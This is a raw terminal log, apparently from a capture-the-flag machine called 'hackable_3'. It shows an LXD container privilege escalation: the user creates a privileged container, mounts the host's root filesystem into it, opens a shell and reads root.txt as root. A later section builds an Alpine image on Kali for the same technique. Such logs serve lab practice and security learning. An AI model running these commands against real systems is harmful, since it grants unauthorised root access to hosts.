+Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]: dir
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+What should the new bridge be called? [default=lxdbr0]: 
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+hackable_3@ubuntu20:/tmp$ 
+hackable_3@ubuntu20:/tmp$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+hackable_3@ubuntu20:/tmp$ lxc config device and ignite mydevice disk source=/path=/mnt/root recursive=true
+Error: unknown command "and" for "lxc config device"
+hackable_3@ubuntu20:/tmp$ lxc config device add ignite mydevice disk source=/path=/mnt/root recursive=true
+Error: Invalid devices: Device validation failed for "mydevice": The recursive option is only supported for additional bind-mounted paths
+hackable_3@ubuntu20:/tmp$ lxc config device and ignite mydevice disk source=/ path=/mnt/root recursive=true
+Error: unknown command "and" for "lxc config device"
+hackable_3@ubuntu20:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+hackable_3@ubuntu20:/tmp$ lxc start ignite
+hackable_3@ubuntu20:/tmp$ lxc exec ignite /bin/sh
+~ # cd /mnt/root/root
+/mnt/root/root # ls
+knockrestart.sh  root.txt         snap
+/mnt/root/root # cat root.txt
+░░█▀░░░░░░░░░░░▀▀███████░░░░
+░░█▌░░░░░░░░░░░░░░░▀██████░░░
+░█▌░░░░░░░░░░░░░░░░███████▌░░
+░█░░░░░░░░░░░░░░░░░████████░░
+▐▌░░░░░░░░░░░░░░░░░▀██████▌░░
+░▌▄███▌░░░░▀████▄░░░░▀████▌░░
+▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░
+▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌
+▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌
+▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌
+░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░
+░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░
+░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░
+░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░
+░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░
+░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░
+░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░
+░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░
+░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░
+▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░
+░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄
+░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░
+░░▄▌████████▄▄▄███████▌░░░░░▄
+░▄▀░██████████████████▌▀▄░░░░
+▀░░░█████▀▀░░░▀███████░░░▀▄░░
+░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░
+░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀
+░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░
+░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░
+░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░
+░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░
+
+invite-me: linkedin.com/in/eliastouguinho
+/mnt/root/root # whoami
+root
+/mnt/root/root # ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:16:3E:F2:CB:F4  
+          inet addr:10.130.208.235  Bcast:10.130.208.255  Mask:255.255.255.0
+          inet6 addr: fd42:d3a4:f80c:35f0:216:3eff:fef2:cbf4/64 Scope:Global
+          inet6 addr: fe80::216:3eff:fef2:cbf4/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:23 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:3344 (3.2 KiB)  TX bytes:1788 (1.7 KiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+---------------------------------------------------------------------------------------------------------
+──(root㉿kali)-[/home/kali/lxd-alpine-builder]
+└─# git clone  https://github.com/saghul/lxd-alpine-builder.git 
+cd lxd-alpine-builder
+
+Cloning into 'lxd-alpine-builder'...
+remote: Enumerating objects: 57, done.
+remote: Counting objects: 100% (15/15), done.
+remote: Compressing objects: 100% (11/11), done.
+remote: Total 57 (delta 6), reused 8 (delta 4), pack-reused 42 (from 1)
+Receiving objects: 100% (57/57), 3.12 MiB | 1.70 MiB/s, done.
+Resolving deltas: 100% (19/19), done.
+                                                                                                                                                                       
+┌──(root㉿kali)-[/home/kali/lxd-alpine-builder/lxd-alpine-builder]
+└─# ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
+                                                                                                                                                                       
+┌──(root㉿kali)-[/home/kali/lxd-alpine-builder/lxd-alpine-builder]
+└─# ./build-alpine
+Determining the latest release... 
+v3.22
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.22/main/x86_64
+Downloading alpine-keys-2.5-r0.apk
+
+
+
+
+
+
+^C  
+                                                                                                                                                                       
+┌──(root㉿kali)-[/home/kali/lxd-alpine-builder/lxd-alpine-builder]
+└─# ./build-alpine
+Determining the latest release... 
+v3.22
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.22/main/x86_64
+Downloading alpine-keys-2.5-r0.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading apk-tools-static-2.14.9-r3.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
+Verified OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3668  100  3668    0     0    760      0  0:00:04  0:00:04 --:--:--   782
+--2025-10-27 14:31:50--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 2a00:1f00:dc06:10::6, 93.187.10.24
+Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::6|:80... 
+failed: Connection timed out.
+Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.24|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3668 (3.6K) [text/plain]
+Saving to: ‘/home/kali/lxd-alpine-builder/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
+
+/home/kali/lxd-alpine-builder/lxd-alpine- 100%[====================================================================================>]   3.58K  --.-KB/s    in 0s      
+
+2025-10-27 14:34:06 (544 MB/s) - ‘/home/kali/lxd-alpine-builder/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [3668/3668]
+
+Selecting mirror http://mirror.lzu.edu.cn/alpine//v3.22/main
+fetch http://mirror.lzu.edu.cn/alpine//v3.22/main/x86_64/APKINDEX.tar.gz
+(1/27) Installing alpine-baselayout-data (3.7.0-r0)
+(2/27) Installing musl (1.2.5-r10)
+(3/27) Installing busybox (1.37.0-r19)
+Executing busybox-1.37.0-r19.post-install
+(4/27) Installing busybox-binsh (1.37.0-r19)
+(5/27) Installing alpine-baselayout (3.7.0-r0)
+Executing alpine-baselayout-3.7.0-r0.pre-install
+Executing alpine-baselayout-3.7.0-r0.post-install
+(6/27) Installing bridge (1.5-r5)
+(7/27) Installing ifupdown-ng (0.12.1-r7)
+(8/27) Installing openrc-user (0.62.6-r0)
+(9/27) Installing libcap2 (2.76-r0)
+(10/27) Installing openrc (0.62.6-r0)
+Executing openrc-0.62.6-r0.post-install
+(11/27) Installing mdev-conf (4.8-r0)
+(12/27) Installing busybox-mdev-openrc (1.37.0-r19)
+(13/27) Installing alpine-conf (3.20.0-r1)
+(14/27) Installing alpine-keys (2.5-r0)
+(15/27) Installing alpine-release (3.22.2-r0)
+(16/27) Installing libcrypto3 (3.5.4-r0)
+(17/27) Installing ca-certificates-bundle (20250911-r0)
+(18/27) Installing libssl3 (3.5.4-r0)
+(19/27) Installing ssl_client (1.37.0-r19)
+(20/27) Installing zlib (1.3.1-r2)
+(21/27) Installing libapk2 (2.14.9-r3)
+(22/27) Installing apk-tools (2.14.9-r3)
+(23/27) Installing busybox-openrc (1.37.0-r19)
+(24/27) Installing busybox-suid (1.37.0-r19)
+(25/27) Installing scanelf (1.3.8-r1)
+(26/27) Installing musl-utils (1.2.5-r10)
+(27/27) Installing alpine-base (3.22.2-r0)
+Executing busybox-1.37.0-r19.trigger
+OK: 9 MiB in 27 packages
+                                                                                                                                                                       
+                                                                                                                                                                      
+┌──(root㉿kali)-[/home/kali/lxd-alpine-builder/lxd-alpine-builder]
+└─# ls -la
+total 7188
+drwxr-xr-x 3 root root    4096 Oct 27 14:35 .
+drwxrwxr-x 4 kali kali    4096 Oct 27 14:15 ..
+-rw-r--r-- 1 root root 3259593 Oct 27 14:15 alpine-v3.13-x86_64-20210218_0139.tar.gz
+-rw-r--r-- 1 root root 4044355 Oct 27 14:35 alpine-v3.22-x86_64-20251027_1435.tar.gz
+-rwxr-xr-x 1 root root    8064 Oct 27 14:15 build-alpine
+drwxr-xr-x 7 root root    4096 Oct 27 14:15 .git
+-rw-r--r-- 1 root root   26530 Oct 27 14:15 LICENSE
+-rw-r--r-- 1 root root     768 Oct 27 14:15 README.md
+                                                         
